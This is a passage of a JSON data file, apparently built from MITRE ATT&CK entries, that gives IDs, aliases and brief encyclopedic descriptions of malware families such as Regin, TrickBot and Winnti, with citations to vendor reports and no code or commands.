    "description": "[RedLeaves](https://attack.mitre.org/software/S0153) is a malware family used by [menuPass](https://attack.mitre.org/groups/G0045). The code overlaps with [PlugX](https://attack.mitre.org/software/S0013) and may be based upon the open source tool Trochilus. (Citation: PWC Cloud Hopper Technical Annex April 2017) (Citation: FireEye APT10 April 2017)",
    "example_uses": []
  },
  "malware--4c59cce8-cb48-4141-b9f1-f646edfaadb0": {
    "id": "S0019",
    "name": "Regin",
    "examples": [],
    "similar_words": [
      "Regin"
    ],
    "description": "[Regin](https://attack.mitre.org/software/S0019) is a malware platform that has targeted victims in a range of industries, including telecom, government, and financial institutions. Some [Regin](https://attack.mitre.org/software/S0019) timestamps date back to 2003. (Citation: Kaspersky Regin)",
    "example_uses": []
  },
  "malware--4e6b9625-bbda-4d96-a652-b3bb45453f26": {
    "id": "S0166",
    "name": "RemoteCMD",
    "examples": [],
    "similar_words": [
      "RemoteCMD"
    ],
    "description": "[RemoteCMD](https://attack.mitre.org/software/S0166) is a custom tool used by [APT3](https://attack.mitre.org/groups/G0022) to execute commands on a remote system similar to SysInternal's PSEXEC functionality. (Citation: Symantec Buckeye)",
    "example_uses": []
  },
  "malware--69d6f4a9-fcf0-4f51-bca7-597c51ad0bb8": {
    "id": "S0125",
    "name": "Remsec",
    "examples": [],
    "similar_words": [
      "Remsec",
      "Backdoor.Remsec",
      "ProjectSauron"
    ],
    "description": "[Remsec](https://attack.mitre.org/software/S0125) is a modular backdoor that has been used by [Strider](https://attack.mitre.org/groups/G0041) and appears to have been designed primarily for espionage purposes. Many of its modules are written in Lua. (Citation: Symantec Strider Blog)",
    "example_uses": []
  },
  "malware--8ec6e3b4-b06d-4805-b6aa-af916acc2122": {
    "id": "S0270",
    "name": "RogueRobin",
    "examples": [],
    "similar_words": [
      "RogueRobin"
    ],
    "description": "[RogueRobin](https://attack.mitre.org/software/S0270) is a custom PowerShell-based payload used by [DarkHydrus](https://attack.mitre.org/groups/G0079). (Citation: Unit 42 DarkHydrus July 2018)",
    "example_uses": []
  },
  "malware--6b616fc1-1505-48e3-8b2c-0d19337bff38": {
    "id": "S0090",
    "name": "Rover",
    "examples": [],
    "similar_words": [
      "Rover"
    ],
    "description": "[Rover](https://attack.mitre.org/software/S0090) is malware suspected of being used for espionage purposes. It was used in 2015 in a targeted email sent to an Indian Ambassador to Afghanistan. (Citation: Palo Alto Rover)",
    "example_uses": []
  },
  "malware--60d50676-459a-47dd-92e9-a827a9fe9c58": {
    "id": "S0253",
    "name": "RunningRAT",
    "examples": [],
    "similar_words": [
      "RunningRAT"
    ],
    "description": "[RunningRAT](https://attack.mitre.org/software/S0253) is a remote access tool that appeared in operations surrounding the 2018 Pyeongchang Winter Olympics along with [Gold Dragon](https://attack.mitre.org/software/S0249) and [Brave Prince](https://attack.mitre.org/software/S0252). (Citation: McAfee Gold Dragon)",
    "example_uses": []
  },
  "malware--66b1dcde-17a0-4c7b-95fa-b08d430c2131": {
    "id": "S0085",
    "name": "S-Type",
    "examples": [],
    "similar_words": [
      "S-Type"
    ],
    "description": "[S-Type](https://attack.mitre.org/software/S0085) is a backdoor that was used by [Dust Storm](https://attack.mitre.org/groups/G0031) from 2013 to 2014. (Citation: Cylance Dust Storm)",
    "example_uses": []
  },
  "malware--0998045d-f96e-4284-95ce-3c8219707486": {
    "id": "S0185",
    "name": "SEASHARPEE",
    "examples": [],
    "similar_words": [
      "SEASHARPEE"
    ],
    "description": "[SEASHARPEE](https://attack.mitre.org/software/S0185) is a Web shell that has been used by [APT34](https://attack.mitre.org/groups/G0057). (Citation: FireEye APT34 Webinar Dec 2017)",
    "example_uses": []
  },
  "malware--b1de6916-7a22-4460-8d26-6b5483ffaa2a": {
    "id": "S0028",
    "name": "SHIPSHAPE",
    "examples": [],
    "similar_words": [
      "SHIPSHAPE"
    ],
    "description": "[SHIPSHAPE](https://attack.mitre.org/software/S0028) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)",
    "example_uses": []
  },
  "malware--58adaaa8-f1e8-4606-9a08-422e568461eb": {
    "id": "S0063",
    "name": "SHOTPUT",
    "examples": [],
    "similar_words": [
      "SHOTPUT",
      "Backdoor.APT.CookieCutter",
      "Pirpi"
    ],
    "description": "[SHOTPUT](https://attack.mitre.org/software/S0063) is a custom backdoor used by [APT3](https://attack.mitre.org/groups/G0022). (Citation: FireEye Clandestine Wolf)",
    "example_uses": []
  },
  "malware--4189a679-72ed-4a89-a57c-7f689712ecf8": {
    "id": "S0217",
    "name": "SHUTTERSPEED",
    "examples": [],
    "similar_words": [
      "SHUTTERSPEED"
    ],
    "description": "[SHUTTERSPEED](https://attack.mitre.org/software/S0217) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--414dc555-c79e-4b24-a2da-9b607f7eaf16": {
    "id": "S0218",
    "name": "SLOWDRIFT",
    "examples": [],
    "similar_words": [
      "SLOWDRIFT"
    ],
    "description": "[SLOWDRIFT](https://attack.mitre.org/software/S0218) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067) against academic and strategic victims in South Korea. (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--3240cbe4-c550-443b-aa76-cc2a7058b870": {
    "id": "S0159",
    "name": "SNUGRIDE",
    "examples": [],
    "similar_words": [
      "SNUGRIDE"
    ],
    "description": "[SNUGRIDE](https://attack.mitre.org/software/S0159) is a backdoor that has been used by [menuPass](https://attack.mitre.org/groups/G0045) as first stage malware. (Citation: FireEye APT10 April 2017)",
    "example_uses": []
  },
  "malware--9ca488bd-9587-48ef-b923-1743523e63b2": {
    "id": "S0157",
    "name": "SOUNDBITE",
    "examples": [],
    "similar_words": [
      "SOUNDBITE"
    ],
    "description": "[SOUNDBITE](https://attack.mitre.org/software/S0157) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)",
    "example_uses": []
  },
  "malware--8b880b41-5139-4807-baa9-309690218719": {
    "id": "S0035",
    "name": "SPACESHIP",
    "examples": [],
    "similar_words": [
      "SPACESHIP"
    ],
    "description": "[SPACESHIP](https://attack.mitre.org/software/S0035) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)",
    "example_uses": []
  },
  "malware--96b08451-b27a-4ff6-893f-790e26393a8e": {
    "id": "S0074",
    "name": "Sakula",
    "examples": [],
    "similar_words": [
      "Sakula",
      "Sakurel",
      "VIPER"
    ],
    "description": "[Sakula](https://attack.mitre.org/software/S0074) is a remote access tool (RAT) that first surfaced in 2012 and was used in intrusions throughout 2015. (Citation: Dell Sakula)",
    "example_uses": []
  },
  "malware--67e6d66b-1b82-4699-b47a-e2efb6268d14": {
    "id": "S0053",
    "name": "SeaDuke",
    "examples": [],
    "similar_words": [
      "SeaDuke",
      "SeaDaddy",
      "SeaDesk"
    ],
    "description": "[SeaDuke](https://attack.mitre.org/software/S0053) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2014 to 2015. It was used primarily as a secondary backdoor for victims that were already compromised with [CozyCar](https://attack.mitre.org/software/S0046). (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--8901ac23-6b50-410c-b0dd-d8174a86f9b3": {
    "id": "S0140",
    "name": "Shamoon",
    "examples": [],
    "similar_words": [
      "Shamoon",
      "Disttrack"
    ],
    "description": "[Shamoon](https://attack.mitre.org/software/S0140) is malware that was first used by an Iranian group known as the \"Cutting Sword of Justice\" in 2012. The 2.0 version was seen in 2016 targeting Middle Eastern states. (Citation: FireEye Shamoon Nov 2016) (Citation: Palo Alto Shamoon Nov 2016)",
    "example_uses": []
  },
  "malware--89f63ae4-f229-4a5c-95ad-6f22ed2b5c49": {
    "id": "S0007",
    "name": "Skeleton Key",
    "examples": [],
    "similar_words": [
      "Skeleton Key"
    ],
    "description": "[Skeleton Key](https://attack.mitre.org/software/S0007) is malware used to inject false credentials into domain controllers with the intent of creating a backdoor password. (Citation: Dell Skeleton) Functionality similar to [Skeleton Key](https://attack.mitre.org/software/S0007) is included as a module in [Mimikatz](https://attack.mitre.org/software/S0002).",
    "example_uses": []
  },
  "malware--0c824410-58ff-49b2-9cf2-1c96b182bdf0": {
    "id": "S0226",
    "name": "Smoke Loader",
    "examples": [],
    "similar_words": [
      "Smoke Loader",
      "Dofoil"
    ],
    "description": "[Smoke Loader](https://attack.mitre.org/software/S0226) is a malicious bot application that can be used to load other malware.\n[Smoke Loader](https://attack.mitre.org/software/S0226) has been seen in the wild since at least 2011 and has included a number of different payloads. It is notorious for its use of deception and self-protection. It also comes with several plug-ins. (Citation: Malwarebytes SmokeLoader 2016) (Citation: Microsoft Dofoil 2018)",
    "example_uses": []
  },
  "malware--e494ad79-37ee-4cd0-866b-299c521d8b94": {
    "id": "S0273",
    "name": "Socksbot",
    "examples": [],
    "similar_words": [
      "Socksbot"
    ],
    "description": "[Socksbot](https://attack.mitre.org/software/S0273) is a backdoor that  abuses Socket Secure (SOCKS) proxies. (Citation: TrendMicro Patchwork Dec 2017)",
    "example_uses": []
  },
  "malware--2fb26586-2b53-4b9a-ad4f-2b3bcb9a2421": {
    "id": "S0058",
    "name": "SslMM",
    "examples": [],
    "similar_words": [
      "SslMM"
    ],
    "description": "[SslMM](https://attack.mitre.org/software/S0058) is a full-featured backdoor used by [Naikon](https://attack.mitre.org/groups/G0019) that has multiple variants. (Citation: Baumgartner Naikon 2015)",
    "example_uses": []
  },
  "malware--96566860-9f11-4b6f-964d-1c924e4f24a4": {
    "id": "S0188",
    "name": "Starloader",
    "examples": [],
    "similar_words": [
      "Starloader"
    ],
    "description": "[Starloader](https://attack.mitre.org/software/S0188) is a loader component that has been observed loading [Felismus](https://attack.mitre.org/software/S0171) and associated tools. (Citation: Symantec Sowbug Nov 2017)",
    "example_uses": []
  },
  "malware--91000a8a-58cc-4aba-9ad0-993ad6302b86": {
    "id": "S0142",
    "name": "StreamEx",
    "examples": [],
    "similar_words": [
      "StreamEx"
    ],
    "description": "[StreamEx](https://attack.mitre.org/software/S0142) is a malware family that has been used by [Deep Panda](https://attack.mitre.org/groups/G0009) since at least 2015. In 2016, it was distributed via legitimate compromised Korean websites. (Citation: Cylance Shell Crew Feb 2017)",
    "example_uses": []
  },
  "malware--6a0ef5d4-fc7c-4dda-85d7-592e4dbdc5d9": {
    "id": "S0018",
    "name": "Sykipot",
    "examples": [],
    "similar_words": [
      "Sykipot"
    ],
    "description": "[Sykipot](https://attack.mitre.org/software/S0018) is malware that has been used in spearphishing campaigns since approximately 2007 against victims primarily in the US. One variant of [Sykipot](https://attack.mitre.org/software/S0018) hijacks smart cards on victims. (Citation: Alienvault Sykipot DOD Smart Cards) The group using this malware has also been referred to as Sykipot. (Citation: Blasco 2013)",
    "example_uses": []
  },
  "malware--04227b24-7817-4de1-9050-b7b1b57f5866": {
    "id": "S0242",
    "name": "SynAck",
    "examples": [],
    "similar_words": [
      "SynAck"
    ],
    "description": "[SynAck](https://attack.mitre.org/software/S0242) is variant of Trojan ransomware targeting mainly English-speaking users since at least fall 2017. (Citation: SecureList SynAck Doppelgänging May 2018) (Citation: Kaspersky Lab SynAck May 2018)",
    "example_uses": []
  },
  "malware--7f8730af-f683-423f-9ee1-5f6875a80481": {
    "id": "S0060",
    "name": "Sys10",
    "examples": [],
    "similar_words": [
      "Sys10"
    ],
    "description": "[Sys10](https://attack.mitre.org/software/S0060) is a backdoor that was used throughout 2013 by [Naikon](https://attack.mitre.org/groups/G0019). (Citation: Baumgartner Naikon 2015)",
    "example_uses": []
  },
  "malware--876f6a77-fbc5-4e13-ab1a-5611986730a3": {
    "id": "S0098",
    "name": "T9000",
    "examples": [],
    "similar_words": [
      "T9000"
    ],
    "description": "[T9000](https://attack.mitre.org/software/S0098) is a backdoor that is a newer variant of the T5000 malware family, also known as Plat1. Its primary function is to gather information about the victim. It has been used in multiple targeted attacks against U.S.-based organizations. (Citation: FireEye admin@338 March 2014) (Citation: Palo Alto T9000 Feb 2016)",
    "example_uses": []
  },
  "malware--0b32ec39-ba61-4864-9ebe-b4b0b73caf9a": {
    "id": "S0164",
    "name": "TDTESS",
    "examples": [],
    "similar_words": [
      "TDTESS"
    ],
    "description": "[TDTESS](https://attack.mitre.org/software/S0164) is a 64-bit .NET binary backdoor used by [CopyKittens](https://attack.mitre.org/groups/G0052). (Citation: ClearSky Wilted Tulip July 2017)",
    "example_uses": []
  },
  "malware--4f6aa78c-c3d4-4883-9840-96ca2f5d6d47": {
    "id": "S0146",
    "name": "TEXTMATE",
    "examples": [],
    "similar_words": [
      "TEXTMATE",
      "DNSMessenger"
    ],
    "description": "[TEXTMATE](https://attack.mitre.org/software/S0146) is a second-stage PowerShell backdoor that is memory-resident. It was observed being used along with [POWERSOURCE](https://attack.mitre.org/software/S0145) in February 2017. (Citation: FireEye FIN7 March 2017)",
    "example_uses": []
  },
  "malware--85b39628-204a-48d2-b377-ec368cbcb7ca": {
    "id": "S0131",
    "name": "TINYTYPHON",
    "examples": [],
    "similar_words": [
      "TINYTYPHON"
    ],
    "description": "[TINYTYPHON](https://attack.mitre.org/software/S0131) is a backdoor  that has been used by the actors responsible for the MONSOON campaign. The majority of its code was reportedly taken from the MyDoom worm. (Citation: Forcepoint Monsoon)",
    "example_uses": []
  },
  "malware--db1355a7-e5c9-4e2c-8da7-eccf2ae9bf5c": {
    "id": "S0199",
    "name": "TURNEDUP",
    "examples": [],
    "similar_words": [
      "TURNEDUP"
    ],
    "description": "[TURNEDUP](https://attack.mitre.org/software/S0199) is a non-public backdoor. It has been dropped by [APT33](https://attack.mitre.org/groups/G0064)'s DROPSHOT malware (also known as Stonedrill). (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)",
    "example_uses": []
  },
  "malware--7ba0fc46-197d-466d-8b9f-f1c64d5d81e5": {
    "id": "S0263",
    "name": "TYPEFRAME",
    "examples": [],
    "similar_words": [
      "TYPEFRAME"
    ],
    "description": "[TYPEFRAME](https://attack.mitre.org/software/S0263) is a remote access tool that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: US-CERT TYPEFRAME June 2018)",
    "example_uses": []
  },
  "malware--b143dfa4-e944-43ff-8429-bfffc308c517": {
    "id": "S0011",
    "name": "Taidoor",
    "examples": [],
    "similar_words": [
      "Taidoor"
    ],
    "description": "[Taidoor](https://attack.mitre.org/software/S0011) is malware that has been used since at least 2010, primarily to target Taiwanese government organizations. (Citation: TrendMicro Taidoor)",
    "example_uses": []
  },
  "malware--c0c45d38-fe57-4cd4-b2b2-9ecd0ddd4ca9": {
    "id": "S0004",
    "name": "TinyZBot",
    "examples": [],
    "similar_words": [
      "TinyZBot"
    ],
    "description": "[TinyZBot](https://attack.mitre.org/software/S0004) is a bot written in C# that was developed by [Cleaver](https://attack.mitre.org/groups/G0003). (Citation: Cylance Cleaver)",
    "example_uses": []
  },
  "malware--00806466-754d-44ea-ad6f-0caf59cb8556": {
    "id": "S0266",
    "name": "TrickBot",
    "examples": [],
    "similar_words": [
      "TrickBot",
      "Totbrick",
      "TSPY_TRICKLOAD"
    ],
    "description": "[TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program that has mainly been used for targeting banking sites in Australia. TrickBot first emerged in the wild in September 2016 and appears to be a successor to [Dyre](https://attack.mitre.org/software/S0024). [TrickBot](https://attack.mitre.org/software/S0266) is developed in the C++ programming language. (Citation: S2 Grupo TrickBot June 2017) (Citation: Fidelis TrickBot Oct 2016) (Citation: IBM TrickBot Nov 2016)",
    "example_uses": []
  },
  "malware--82cb34ba-02b5-432b-b2d2-07f55cbf674d": {
    "id": "S0094",
    "name": "Trojan.Karagany",
    "examples": [],
    "similar_words": [
      "Trojan.Karagany"
    ],
    "description": "[Trojan.Karagany](https://attack.mitre.org/software/S0094) is a backdoor primarily used for recon. The source code for it was leaked in 2010 and it is sold on underground forums. (Citation: Symantec Dragonfly)",
    "example_uses": []
  },
  "malware--c5e9cb46-aced-466c-85ea-7db5572ad9ec": {
    "id": "S0001",
    "name": "Trojan.Mebromi",
    "examples": [],
    "similar_words": [
      "Trojan.Mebromi"
    ],
    "description": "[Trojan.Mebromi](https://attack.mitre.org/software/S0001) is BIOS-level malware that takes control of the victim before MBR. (Citation: Ge 2011)",
    "example_uses": []
  },
  "malware--691c60e2-273d-4d56-9ce6-b67e0f8719ad": {
    "id": "S0178",
    "name": "Truvasys",
    "examples": [],
    "similar_words": [
      "Truvasys"
    ],
    "description": "[Truvasys](https://attack.mitre.org/software/S0178) is first-stage malware that has been used by [PROMETHIUM](https://attack.mitre.org/groups/G0056). It is a collection of modules written in the Delphi programming language. (Citation: Microsoft Win Defender Truvasys Sep 2017) (Citation: Microsoft NEODYMIUM Dec 2016) (Citation: Microsoft SIR Vol 21)",
    "example_uses": []
  },
  "malware--fb4e3792-e915-4fdd-a9cd-92dfa2ace7aa": {
    "id": "S0275",
    "name": "UPPERCUT",
    "examples": [],
    "similar_words": [
      "UPPERCUT",
      "ANEL"
    ],
    "description": "[UPPERCUT](https://attack.mitre.org/software/S0275) is a backdoor that has been used by [menuPass](https://attack.mitre.org/groups/G0045). (Citation: FireEye APT10 Sept 2018)",
    "example_uses": []
  },
  "malware--af2ad3b7-ab6a-4807-91fd-51bcaff9acbb": {
    "id": "S0136",
    "name": "USBStealer",
    "examples": [],
    "similar_words": [
      "USBStealer",
      "USB Stealer",
      "Win32/USBStealer"
    ],
    "description": "[USBStealer](https://attack.mitre.org/software/S0136) is malware that has used by [APT28](https://attack.mitre.org/groups/G0007) since at least 2005 to extract information from air-gapped networks. It does not have the capability to communicate over the Internet and has been used in conjunction with [ADVSTORESHELL](https://attack.mitre.org/software/S0045). (Citation: ESET Sednit USBStealer 2014) (Citation: Kaspersky Sofacy)",
    "example_uses": []
  },
  "malware--3d8e547d-9456-4f32-a895-dc86134e282f": {
    "id": "S0221",
    "name": "Umbreon",
    "examples": [],
    "similar_words": [
      "Umbreon"
    ],
    "description": "A Linux rootkit that provides backdoor access and hides from defenders.",
    "example_uses": []
  },
  "malware--ab3580c8-8435-4117-aace-3d9fbe46aa56": {
    "id": "S0130",
    "name": "Unknown Logger",
    "examples": [],
    "similar_words": [
      "Unknown Logger"
    ],
    "description": "[Unknown Logger](https://attack.mitre.org/software/S0130) is a publicly released, free backdoor. Version 1.5 of the backdoor has been used by the actors responsible for the MONSOON campaign. (Citation: Forcepoint Monsoon)",
    "example_uses": []
  },
  "malware--80a014ba-3fef-4768-990b-37d8bd10d7f4": {
    "id": "S0022",
    "name": "Uroburos",
    "examples": [],
    "similar_words": [
      "Uroburos"
    ],
    "description": "[Uroburos](https://attack.mitre.org/software/S0022) is a rootkit used by [Turla](https://attack.mitre.org/groups/G0010). (Citation: Kaspersky Turla)",
    "example_uses": []
  },
  "malware--5189f018-fea2-45d7-b0ed-23f9ee0a46f3": {
    "id": "S0257",
    "name": "VERMIN",
    "examples": [],
    "similar_words": [
      "VERMIN"
    ],
    "description": "[VERMIN](https://attack.mitre.org/software/S0257) is a remote access tool written in the Microsoft .NET framework. It is mostly composed of original code, but also has some open source code. (Citation: Unit 42 VERMIN Jan 2018)",
    "example_uses": []
  },
  "malware--f4d8a2d6-c684-453a-8a14-cf4a94f755c5": {
    "id": "S0207",
    "name": "Vasport",
    "examples": [],
    "similar_words": [
      "Vasport"
    ],
    "description": "[Vasport](https://attack.mitre.org/software/S0207) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Vasport May 2012)",
    "example_uses": []
  },
  "malware--495b6cdb-7b5a-4fbc-8d33-e7ef68806d08": {
    "id": "S0180",
    "name": "Volgmer",
    "examples": [],
    "similar_words": [
      "Volgmer"
    ],
    "description": "[Volgmer](https://attack.mitre.org/software/S0180) is a backdoor Trojan designed to provide covert access to a compromised system. It has been used since at least 2013 to target the government, financial, automotive, and media industries. Its primary delivery mechanism is suspected to be spearphishing. (Citation: US-CERT Volgmer Nov 2017)",
    "example_uses": []
  },
  "malware--1d808f62-cf63-4063-9727-ff6132514c22": {
    "id": "S0109",
    "name": "WEBC2",
    "examples": [],
    "similar_words": [
      "WEBC2"
    ],
    "description": "[WEBC2](https://attack.mitre.org/software/S0109) is a backdoor used by [APT1](https://attack.mitre.org/groups/G0006) to retrieve a Web page from a predetermined C2 server. (Citation: Mandiant APT1 Appendix)",
    "example_uses": []
  },
  "malware--98e8a977-3416-43aa-87fa-33e287e9c14c": {
    "id": "S0155",
    "name": "WINDSHIELD",
    "examples": [],
    "similar_words": [
      "WINDSHIELD"
    ],
    "description": "[WINDSHIELD](https://attack.mitre.org/software/S0155) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)",
    "example_uses": []
  },
  "malware--49abab73-3c5c-476e-afd5-69b5c732d845": {
    "id": "S0219",
    "name": "WINERACK",
    "examples": [],
    "similar_words": [
      "WINERACK"
    ],
    "description": "[WINERACK](https://attack.mitre.org/software/S0219) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--039814a0-88de-46c5-a4fb-b293db21880a": {
    "id": "S0206",
    "name": "Wiarp",
    "examples": [],
    "similar_words": [
      "Wiarp"
    ],
    "description": "[Wiarp](https://attack.mitre.org/software/S0206) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Wiarp May 2012)",
    "example_uses": []
  },
  "malware--22addc7b-b39f-483d-979a-1b35147da5de": {
    "id": "S0059",
    "name": "WinMM",
    "examples": [],
    "similar_words": [
      "WinMM"
    ],
    "description": "[WinMM](https://attack.mitre.org/software/S0059) is a full-featured, simple backdoor used by [Naikon](https://attack.mitre.org/groups/G0019). (Citation: Baumgartner Naikon 2015)",
    "example_uses": []
  },
  "malware--a8d3d497-2da9-4797-8e0b-ed176be08654": {
    "id": "S0176",
    "name": "Wingbird",
    "examples": [],
    "similar_words": [
      "Wingbird"
    ],
    "description": "[Wingbird](https://attack.mitre.org/software/S0176) is a backdoor that appears to be a version of commercial software [FinFisher](https://attack.mitre.org/software/S0182). It is reportedly used to attack individual computers instead of networks. It was used by [NEODYMIUM](https://attack.mitre.org/groups/G0055) in a May 2016 campaign. (Citation: Microsoft SIR Vol 21) (Citation: Microsoft NEODYMIUM Dec 2016)",
    "example_uses": []
  },
  "malware--d3afa961-a80c-4043-9509-282cdf69ab21": {
    "id": "S0141",
    "name": "Winnti",
    "examples": [],
    "similar_words": [
      "Winnti"
    ],
    "description": "[Winnti](https://attack.mitre.org/software/S0141) is a Trojan that has been used by multiple groups to carry out intrusions in varied regions from at least 2010 to 2016. One of the groups using this malware is referred to by the same name, [Winnti Group](https://attack.mitre.org/groups/G0044); however, reporting indicates a second distinct group, [Axiom](https://attack.mitre.org/groups/G0001), also uses the malware. (Citation: Kaspersky Winnti April 2013) (Citation: Microsoft Winnti Jan 2017) (Citation: Novetta Winnti April 2015)",
    "example_uses": []
  },
  "malware--a19c49aa-36fe-4c05-b817-23e1c7a7d085": {
    "id": "S0041",
    "name": "Wiper",
    "examples": [],
    "similar_words": [
      "Wiper"
    ],
    "description": "[Wiper](https://attack.mitre.org/software/S0041) is a family of destructive malware used in March 2013 during breaches of South Korean banks and media companies. (Citation: Dell Wiper)",
    "example_uses": []
  },
  "malware--59a97b15-8189-4d51-9404-e1ce8ea4a069": {
    "id": "S0161",
    "name": "XAgentOSX",
    "examples": [],
    "similar_words": [
      "XAgentOSX",
      "OSX.Sofacy"
    ],
    "description": "[XAgentOSX](https://attack.mitre.org/software/S0161) is a trojan that has been used by [APT28](https://attack.mitre.org/groups/G0007)  on OS X and appears to be a port of their standard [CHOPSTICK](https://attack.mitre.org/software/S0023) or XAgent trojan. (Citation: XAgentOSX)",
    "example_uses": []
  },
  "malware--7343e208-7cab-45f2-a47b-41ba5e2f0fab": {
    "id": "S0117",
    "name": "XTunnel",
    "examples": [],
    "similar_words": [
      "XTunnel",
      "Trojan.Shunnael",
      "X-Tunnel",
      "XAPS"
    ],
    "description": "[XTunnel](https://attack.mitre.org/software/S0117) a VPN-like network proxy tool that can relay traffic between a C2 server and a victim. It was first seen in May 2013 and reportedly used by [APT28](https://attack.mitre.org/groups/G0007) during the compromise of the Democratic National Committee. (Citation: Crowdstrike DNC June 2016) (Citation: Invincea XTunnel) (Citation: ESET Sednit Part 2)",
    "example_uses": []
  },
  "malware--166c0eca-02fd-424a-92c0-6b5106994d31": {
    "id": "S0086",
    "name": "ZLib",
    "examples": [],
    "similar_words": [
      "ZLib"
    ],
    "description": "[ZLib](https://attack.mitre.org/software/S0086) is a full-featured backdoor that was used as a second-stage implant by [Dust Storm](https://attack.mitre.org/groups/G0031) from 2014 to 2015. It is malware and should not be confused with the compression library from which its name is derived. (Citation: Cylance Dust Storm)",
    "example_uses": []
  },
  "malware--a4f57468-fbd5-49e4-8476-52088220b92d": {
    "id": "S0251",
    "name": "Zebrocy",
    "examples": [],
    "similar_words": [
      "Zebrocy"
    ],
    "description": "[Zebrocy](https://attack.mitre.org/software/S0251) is a Trojan used by [APT28](https://attack.mitre.org/groups/G0007). [Zebrocy](https://attack.mitre.org/software/S0251) was seen used in attacks in early 2018. [Zebrocy](https://attack.mitre.org/software/S0251) comes in several programming language variants, including C++, Delphi, and AutoIt. (Citation: Palo Alto Sofacy 06-2018)",
    "example_uses": []
  },
  "malware--4ab44516-ad75-4e43-a280-705dc0420e2f": {
    "id": "S0230",
    "name": "ZeroT",
    "examples": [],
    "similar_words": [
      "ZeroT"
    ],
    "description": "[ZeroT](https://attack.mitre.org/software/S0230) is a Trojan used by [TA459](https://attack.mitre.org/groups/G0062), often in conjunction with [PlugX](https://attack.mitre.org/software/S0013). (Citation: Proofpoint TA459 April 2017) (Citation: Proofpoint ZeroT Feb 2017)",
    "example_uses": []
  },
  "malware--552462b9-ae79-49dd-855c-5973014e157f": {
    "id": "S0027",
    "name": "Zeroaccess",
    "examples": [],
    "similar_words": [
      "Zeroaccess",
      "Trojan.Zeroaccess"
    ],
    "description": "[Zeroaccess](https://attack.mitre.org/software/S0027) is a kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that attempts to add victims to the ZeroAccess botnet, often for monetary gain. (Citation: Sophos ZeroAccess)",
    "example_uses": []
  },
  "malware--0f1ad2ef-41d4-4b7a-9304-ddae68ea3005": {
    "id": "S0202",
    "name": "adbupd",
    "examples": [],
    "similar_words": [
      "adbupd"
    ],
    "description": "[adbupd](https://attack.mitre.org/software/S0202) is a backdoor used by [PLATINUM](https://attack.mitre.org/groups/G0068) that is similar to [Dipsind](https://attack.mitre.org/software/S0200). (Citation: Microsoft PLATINUM April 2016)",
    "example_uses": []
  },
  "malware--88c621a7-aef9-4ae0-94e3-1fc87123eb24": {
    "id": "S0032",
    "name": "gh0st",
    "examples": [],
    "similar_words": [
      "gh0st RAT"
    ],
    "description": "[gh0st](https://attack.mitre.org/software/S0032) is a remote access tool (RAT). The source code is public and it has been used by many groups. (Citation: FireEye Hacking Team)",
    "example_uses": []
  },
  "malware--9e2bba94-950b-4fcf-8070-cb3f816c5f4e": {
    "id": "S0071",
    "name": "hcdLoader",
    "examples": [],
    "similar_words": [
      "hcdLoader"
    ],
    "description": "[hcdLoader](https://attack.mitre.org/software/S0071) is a remote access tool (RAT) that has been used by [APT18](https://attack.mitre.org/groups/G0026). (Citation: Dell Lateral Movement)",
    "example_uses": []
  },
  "malware--e8268361-a599-4e45-bd3f-71c8c7e700c0": {
    "id": "S0068",
    "name": "httpclient",
    "examples": [],
    "similar_words": [
      "httpclient"
    ],
    "description": "[httpclient](https://attack.mitre.org/software/S0068) is malware used by [Putter Panda](https://attack.mitre.org/groups/G0024). It is a simple tool that provides a limited range of functionality, suggesting it is likely used as a second-stage or supplementary/backup tool. (Citation: CrowdStrike Putter Panda)",
    "example_uses": []
  },
  "malware--2cfe8a26-5be7-4a09-8915-ea3d9e787513": {
    "id": "S0278",
    "name": "iKitten",
    "examples": [],
    "similar_words": [
      "iKitten",
      "OSX/MacDownloader"
    ],
    "description": "[iKitten](https://attack.mitre.org/software/S0278) is a macOS exfiltration agent  (Citation: objsee mac malware 2017).",
    "example_uses": []
  },
  "malware--efece7e8-e40b-49c2-9f84-c55c5c93d05c": {
    "id": "S0283",
    "name": "jRAT",
    "examples": [],
    "similar_words": [
      "jRAT",
      "JSocket",
      "AlienSpy",
      "Frutas",
      "Sockrat",
      "Unrecom",
      "jFrutas",
      "Adwind",
      "jBiFrost",
      "Trojan.Maljava"
    ],
    "description": "[jRAT](https://attack.mitre.org/software/S0283) is a cross-platform remote access tool that was first observed in November 2017. (Citation: jRAT Symantec Aug 2018)",
    "example_uses": []
  },
  "malware--800bdfba-6d66-480f-9f45-15845c05cb5d": {
    "id": "S0067",
    "name": "pngdowner",
    "examples": [],
    "similar_words": [
      "pngdowner"
    ],
    "description": "[pngdowner](https://attack.mitre.org/software/S0067) is malware used by [Putter Panda](https://attack.mitre.org/groups/G0024). It is a simple tool with limited functionality and no persistence mechanism, suggesting it is used only as a simple \"download-and-\nexecute\" utility. (Citation: CrowdStrike Putter Panda)",
    "example_uses": []
  },
  "malware--0817aaf2-afea-4c32-9285-4dcd1df5bf14": {
    "id": "S0248",
    "name": "yty",
